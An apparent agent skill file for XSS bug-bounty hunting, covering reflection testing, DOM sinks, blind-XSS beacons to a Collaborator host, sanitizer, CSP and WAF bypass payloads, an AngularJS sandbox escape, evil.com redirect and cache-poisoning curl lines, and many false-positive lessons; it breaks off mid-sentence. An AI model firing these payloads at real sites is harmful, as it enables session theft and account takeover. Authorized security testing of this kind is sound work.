---
name: hunt-xss
description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
---
---

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**BUT: a server-side echo that is escaped or double-encoded is NOT proof the page is safe.** A page can read `location.search` itself and write it into a DOM sink, in which case the server never sees the payload at all and a body scanner reports a false negative. Before concluding "no XSS" from a clean body scan, read the page's own JavaScript: enumerate every `<input>`/`<select>` name, then find every `innerHTML` / `.html()` / `document.write` write in the loaded scripts and classify its SOURCE. Third-party landing-page toolkits (Eloqua, Marketo, Pardot, HubSpot) ship a "fill this form from the query string" script that copies ANY parameter — hidden inputs included — into the field of the same name, applying its OWN decoder, and a form script that writes those values into `innerHTML`. Fetch those scripts from THEIR OWN host (a CDN), not the page's host.

**A server-side echo that is inert is a coverage signal, not a verdict.** If the only place your marker appears is inside a tracking pixel or a double-encoded attribute, the hunt has found the wrong reflection path — keep looking for the client-side one rather than writing "the endpoint is safe".

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Client-side sources the SERVER NEVER SEES.** A value the server does
not reflect can still be attacker-controlled and still reach a sink,
because the BROWSER has it. A body scanner reports nothing on these, so
a "no reflection in the response" conclusion is WRONG for them:

- **request headers read at render time** - `navigator.userAgent`,
  `navigator.language`, `navigator.platform`
- **the fragment** - `location.hash` is never sent to the server
- `document.referrer`, `document.URL`, `window.name`,
  `document.cookie`, `localStorage`
- `postMessage` event data

The `User-Agent` case is worth stating plainly, because it is easy to
miss and it is real:

```js
document.write( '<p ...><strong>Your browser: '
                + navigator.userAgent + "</strong></p>" );
```

`navigator.userAgent` IS the `User-Agent` request header. A request can
carry any value, `document.write` parses its argument as HTML, and the
concatenated value is never encoded - so `"><img src=x onerror=alert(1)>`
in the header creates a real element with a real handler. The server
response is byte-identical for every UA, so this is invisible to a body
scanner and to any "is it reflected in the body" test.

**The delivery precondition is part of the severity.** For a header
sink, a victim clicking a link sends THEIR OWN browser's UA, not the
attacker's. Delivering it needs a client that lets the user set a
custom UA, or an intermediary that rewrites the header. That is
`AC:H` / `UI:R` in CVSS, and on a page with no session it caps the
finding at Low even when the execution is fully proven. Run the
Pre-Severity Gate in `triage-validation` before labelling it Medium.

**A proven execution is not a reportable finding, and the gap is
usually three checks wide.** Before writing the report, measure:

1. **Is any sink fed by a LINK-CARRIABLE source?** `location.search`,
   `location.hash`, `document.referrer` and `location.href` are
   link-carriable. `navigator.userAgent` is NOT - a victim clicking a
   link sends their own browser's UA. If the only sink on the page is
   the header one, there is no link-deliverable path, and that fact
   belongs in the report. Test `#payload` and `?payload` in a real
   browser and report the result either way.
2. **What is on the page?** `document.cookie`, `localStorage` keys,
   forms, authenticated APIs. A static page with none of these has
   zero impact, so the honest CVSS is `C:N/I:N/A:N` - not `C:L`.
   `C:L` requires something to read.
3. **Can a victim load the page at all?** Read the certificate chain's
   `Verify return code` with `openssl s_client`. `0` means the browser
   loads it silently. `10` is an expired leaf, `19` a self-signed
   root not in any trust store, `20` an unknown issuer - each of those
   puts a full-page interstitial in front of the victim. Do not guess
   "these demo pages must be expired"; measure it.

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Measure the SERVER's reflection limits before designing a sweep.** Two server-side limits silently truncate coverage if ignored, and both make a parameter look inert when it is not:
   - **Query-string truncation** — many servers echo only the first ~500 bytes of the query string (head kept, tail dropped). Sending 100 parameters in one request means the tail ones are never reflected, and you will wrongly conclude "that parameter does not reflect". Split the parameter list into chunks that fit under the limit.
   - **Request-target length cap** — a request line above ~2 KB may return 404/400 instead of the page. A longer marker changes the length, so a long marker can flip a 200 into a 404 and look like "no reflection".

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

    **A payload that reaches the DOM but does not FIRE is still a finding.** Separate "reflected into the DOM" from "executed". Two traps make a working payload look dead:
    - `src=""` resolves to the page URL, which loads fine, so `onerror` NEVER fires. Use a non-resolving host: `src=//no.such.host.invalid/x`.
    - Separating attributes with `/` instead of a SPACE yields `src=""` plus a separate `onerror` attribute — the handler is present but inert.
    - `<svg onload=...>` inserted via `innerHTML` does NOT fire in Chromium (SVG markup in the HTML parser does not take the SVG load path). `<details open ontoggle=...>`, `<video src=x onerror=...>`, `<audio src=x onerror=...>` and `<marquee onstart=...>` DO fire. `<script>` inserted via `innerHTML` never executes (HTML spec).
    - `=` inside the value is fine IF the value is percent-encoded as `%3d` in the URL, because a `split("=")` based decoder truncates a raw `=`. `%3d` survives the split and is decoded to `=` afterwards.

    **A same-origin `fetch()` from the injected handler is the strongest proof of execution** and needs no network setup: `fetch('/some-page').then(r=>r.text()).then(t=>document.title='LEN'+t.length)` proves the injected code ran with the victim's origin privileges.

    **Beware mixed content when using an out-of-band beacon.** An `http://` beacon fired from an `https://` page is blocked before it leaves the browser, so a negative beacon result proves nothing. Prefer an in-page marker (`document.title`, a `data-` attribute on `document.body`) read back from the same browser session.

    **Prove the browser test can fail before trusting a clean result.** A browser run that reports "no alert" proves nothing unless the alert hook is shown to work. Install the hook and fire a known-executing control page FIRST; only then are the negative results meaningful.

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target.com/page" | grep -i "evil.com"
```

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`

**Filter Evasion:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
    - `PARAM` = the reflected parameter you found.
    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.

---

## AN EMPTY INPUT MAKES A CRAWLER SUCCEED INSTANTLY

A crawl reported "produced nothing": `katana` exited **0 in 0 seconds**
and wrote no file. The host list was built by reading `status_code` from
the `live_subdomains` collection - **which has no such field** (the
status lives in `http`). Every status was `None`, the list came out
empty, and the crawler was handed an empty file: exit 0, no output, no
error.

- **Refuse to run on an empty target list.** "Produced nothing" and "was
  never given anything" are different claims, and the second is about the
  harness.
- Before reading a field, confirm the collection HAS it. A missing field
  yields `None`, not an error, and `None` propagates into an empty result
  set that looks like a clean sweep.

## A MARKER AT AN innerHTML SETTER IS NOT XSS — TAKE A STACK TRACE

The most expensive false positive in this class. With `?p=<img src=x onerror=1>MARK` an innerHTML hook fires and the payload looks executable. The write can be the application's **own sanitiser**: the classic `stripTags` does `d=document.createElement('div'); d.innerHTML=s; return d.textContent` — it sets `innerHTML` on a DETACHED element and reads `textContent` back, so nothing is ever parsed. Attach `new Error().stack` to every sink hit and name the caller's file. If the caller is a `stripTags`/`sanitize`/`clean` function, it is a FP. Three controls decide it: (a) a non-executing tag (`<b>MARK</b>`) must produce a real `<b>` ELEMENT in the document — if no element is built, no markup was parsed; (b) the executing payload must set an observable flag; (c) both are compared against a neutral value on the same page. A "Blocked" title from the WAF on the payload case is a 4th signal.

## ESCAPING IS PER-CHARACTER — `<` SURVIVING SAYS NOTHING ABOUT `"`

A raw `<` inside a JS string is inert. Test each context-terminating character SEPARATELY, one request each, so a filter is attributable: `"` (closes a JS string), `\` (escapes the closer), `</script>` (ends the script ELEMENT, needs no quote). Real server behaviour seen in the wild: `<` passes raw while `"` becomes `\"` and `\` becomes `\\` — a correct JS-string escaper, not XSS. And `&quot;` echoed verbatim inside `<script>` is INERT, because HTML entities are not decoded in the script data state.

## THE ANGLE-BRACKET BLIND SPOT: UNQUOTED ATTRIBUTES

A classifier that keys on `<` misses `<input value=PAYLOAD>`: there a SPACE ends the attribute, so `x onfocus=alert(1) autofocus` needs no angle bracket at all. Probe that case with a space-bearing, quote-free payload and read the raw bytes around the reflection to decide whether the attribute is quoted.

## HEADERS AND CHALLENGE PAGES MASQUERADE AS REFLECTIONS

- A value echoed into a `Location` header is a "reflected" hit for header-aware scanners while a body-only scanner sees `absent`. When those two disagree, check `Location` before doubting either.
- Cloudflare/Imperva challenge pages echo the whole request URL (`403` + `cType:'managed'`, `cRay:`, `__cf_chl_tk`), and an app page can equally quote the full request URL into its own JSON (`requestURL`, `passportAccountURL`, `continue=`). Count those classes SEPARATELY, never pooled, and read the status mix: if most "reflections" are not 200s they are infrastructure, not the application.

## THE x8 PARAMETER SURFACE IS A SEPARATE DISCOVERY CHANNEL

A crawl's URLs and the x8 output (`endpoints.param_records`) find DIFFERENT
parameters: x8 recovers them by parsing JavaScript, so it holds endpoints the
crawler never turned into a URL. Sizes seen on one scope: **43,557 in-scope
(endpoint, parameter) pairs across 370 hosts**, versus the 1,615 targets a
crawl-derived sweep actually probed. When a URL-based sweep returns zero, mine
`param_records` before concluding — and read the method/location mix
(`GET 43,346 · POST 199`), because a near-absent POST half means there is no body
surface to test at all.

## WORDPRESS IS A PLATFORM, NOT A PARAMETER — AND IT IS OFTEN 403-WALLED

`?s=`, `?cat=`, `?tag=`, `?p=`, `?author=`, `/wp-json/`, `/xmlrpc.php` carry the
classic theme-echo reflection. Detect an instance from any `wp-content`,
`wp-includes`, `wp-json`, `wp-admin` path or x8 parameter. But **check it renders
before testing it**: a single 200 on the root can be a fluke — load the root in a
real browser too. Seen here: root 200 showing a theme name, then `/`, `/?s=` and
`/wp-json/` all **403** in both urllib and Chromium, so no WordPress page is
reachable unauthenticated. Report that as **blocked, not clean** — nothing is
proven about the themes or plugins because nothing renders.

## A BACKSLASH PATH THAT REPEATS THE HOST IS WORTH DECIDING

A path shaped `/%5C/<host>%5C/<lang>%5C/wp-admin%5C/x.js` repeats the authority;
on a parser that normalises `\` to `/` that becomes the open-redirect / SSRF
shape. Test three forms per path — `%5C` encoded, plain-slash control, and fully
decoded — and compare status AND the parsed `Location` netloc. Agreement on all
three with no off-host netloc means the edge normalises it; close it then rather
than leaving it in a worklist.

## A VERIFIER WRITTEN FROM PROSE MIS-REMEMBERS THE ROW IT CHECKS

Assert against the artifact's actual value, never a set reconstructed from the
note's prose. A check demanding `tag` on a host whose artifact held it on a
different host failed — correctly — because the assertion was written from
memory. When a note quotes a list, compare the EXACT sorted list to what the
file holds.

## A NON-VACUITY TEST CAN ITSELF BE BROKEN

A reflection scanner reported `raw=0 encoded=0` across 400 URLs. The
non-vacuity test caught a real bug - the marker token was built as
`"zq"+rnd` while the raw form was `"zq9k7<"+rnd+">"`, so when a page
HTML-escaped the value the token split in two and an escaped reflection
classified as `absent`. After the fix the same sweep reports
`enc=542..591`.

Two things to carry forward:
- **The token must survive escaping CONTIGUOUSLY** - build the raw form
  FROM the token, never from the random part separately.
- **The harness repeated the same mistake** and kept failing after the
  scanner was fixed, so for one round the test was wrong and the code
  under test was right. When a control disagrees with your fix, suspect
  the control.
- A detector that reports zero while unable to report anything is worse
  than no detector. Prove it can fire on a local page with a KNOWN
  behaviour before trusting any zero it produces.

## A LEAD ABSENT FROM ONE ARTIFACT IS NOT AN ABSENT LEAD

A `?redirecturl=` URL on a logout endpoint was looked up in the newest
crawl artifact's `fresh_urls` (capped at 500), was not there, and the
phase reported "shapes tested: 0" - then declared the lead closed. The
URL **is** in the corpus. A lookup narrowed to the newest output can
silently drop the thing you are looking for.

## RANK NEW PARAMETERS BY CLASS, AND NAME WHAT YOU SKIP

A fresh crawl of 25 hosts produced 69,105 URLs, 4,065 parameterised,
**103 parameter names the corpus did not have**. Sort them into classes
and say which are skipped and why:

- redirect-shaped (`redirecturl`, `returnPath`, `navigatingFrom`) -> open
  redirect / SSRF; test with a parsed `Location` whose **netloc** is
  off-host, plus a control fetched FIRST
- reflection-shaped (`errorCode`, `ReasonCode`, `view`) -> reflected XSS
- **IDOR-shaped (`collectionid`, `technoteId`, `review_id`) - SKIP
  without a session.** Guessing IDs unauthenticated produces exactly the
  false positive class that a control rejects.

A control that itself redirects makes the test uninformative: fetch it
first and record its status. And when every shape returns the SAME
in-scope Location as the control, the parameter is **ignored** - that is
a clean close, not a weak signal.

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## A BACKWARD SLICE BEATS A TOKEN SCAN - BUT VERIFY THE SLICER FIRST

A source token and a sink token in one file is not a flow. Do a bounded
backward slice: take the sink's ARGUMENT and test it for a source; else take the
identifiers in it and walk back for `ident = RHS` naming a source; then one more
hop. Classify `direct` / `assigned` / `chained`, and count `literal`-argument
sinks separately as the co-occurrence noise you removed.

**Then prove the slicer fires before believing any count.** Two bugs made a
whole 1,334-file pass worthless, and only the fixtures caught them:

- **`seg[1:]` amputates the expression.** If the sink regex already consumes
  `= ` (as `.innerHTML\s*=\s*` does), the captured segment starts at the
  expression, so slicing its first character turns `h;` into `;` - **every
  assignment-style flow dies silently**. Strip a leading `=` only when one is
  genuinely present.
- **An identifier regex of `[A-Za-z_$][\w$]{1,40}` requires TWO characters**, so
  the one-letter variables that ordinary and minified code both use (`h`, `q`,
  `x`, `e`) are invisible to the extractor. Use `{0,40}`.

Symptoms of these bugs: candidates dominated by call-style sinks and by
framework DOM *building*; almost no `innerHTML =` rows. Related trap: **do not
register the construction string `$('<...` as a SOURCE** - it is a sink-side
constructor, and it invented 16 fake candidates in one 8 KB file. Keep fixtures:
`hash->innerHTML`, `search->.html()`, `hash->var->var->innerHTML`,
`postMessage->innerHTML`, `eval(hash)`, `cookie->document.write`, plus negatives
(a literal argument; a file holding both tokens with no path between them).

## `e.data` IN AN EVENT HANDLER IS NOT ALWAYS `postMessage`

A handler shaped `function(e){ ... eval(e.data.href) ... }` looks like a
message-driven eval. Check how the handler is BOUND first: a call like
`keyboard.bind(keys, callback, {href: href})` passes the binder's own payload as
`e.data`. Decisive test: does the file contain the literal `postMessage`, and any
mention of `origin`, at all? **Zero of both means no attacker drives it** -
source misattribution, not a finding.

Likewise, many message handlers with no origin comparison is not automatically a
bug: read each one and check where `event.data` goes. Real library patterns seen:
a web-worker pool (`o.push(n.data)` into a worker array), a forge PRNG handshake
(`n.data.forge.prng`), a MutationObserver self-post (`t.source === window &&
t.data === e`), a MessageChannel polyfill. None reaches a sink.

## RECONCILE A CANDIDATE'S RECORDED SOURCE WITH THE REAL LINE

A slicer reports the source it found on the backward walk, which may not be the
value the sink actually receives. Two seen in one pass: a
`dangerouslySetInnerHTML` attribute attributed to `location.href` when
`location.href` only fed a URL *resolver* for a sibling prop (the real value was a
search-result field already passed through a full escaper); and an `innerHTML = t`
helper attributed to `location.href` when its call sites passed a server response
field. **Open the sink line and name the value by hand before writing anything.**

## A SANITIZER MAY SIT IN THE FALLBACK BRANCH, NOT THE PRIMARY ONE

A highlighter shaped `function ni(e){ let t = getSnippet(e) || escapeString(getRaw(e)); ... }`
reads as unescaped if you only look at the primary path. Here the `snippet` branch
was raw but carries a SEARCH-ENGINE field rather than a URL parameter, while the
fallback escaped `& " ' < >`. Name which branch carries which data before calling
it a flow.

## THE INLINE `<script>` PASS IS A DIFFERENT SURFACE - AND IT IS USUALLY JSON

Reading every JS *file* leaves hand-written inline application code unread. Run
the same analyzer over each page's inline blocks - but expect the reachable
pages to be Next.js/React shells whose inline scripts are **JSON payloads**
(`self.__next_f.push(...)`), not logic. Measured on one scope: 2,033 inline
blocks, **91% carrying no source token at all**; the 143 blocks holding both a
source AND a sink were the *same* 1,700-byte loader served on dozens of pages,
where the tokens sat in configuration strings rather than on a path.

So a zero here must be explained, not just reported: run the extractor over a
synthetic page that is mostly a JSON payload plus ONE hand-written handler, and
confirm it still finds the handler. Otherwise "the inline code is clean" and "my
extractor only sees JSON" are indistinguishable.

## A SINK SPLIT WHOSE TWO NAMES SHARE ONE PATTERN DOUBLE-COUNTS EVERY SITE

`script.src` and `iframe.src` cannot be distinguished without knowing the
element's tag, so naming them separately while giving both the pattern
`\.\s*src\s*=\s*` makes **every** `.src =` site match twice. The tell: two sink
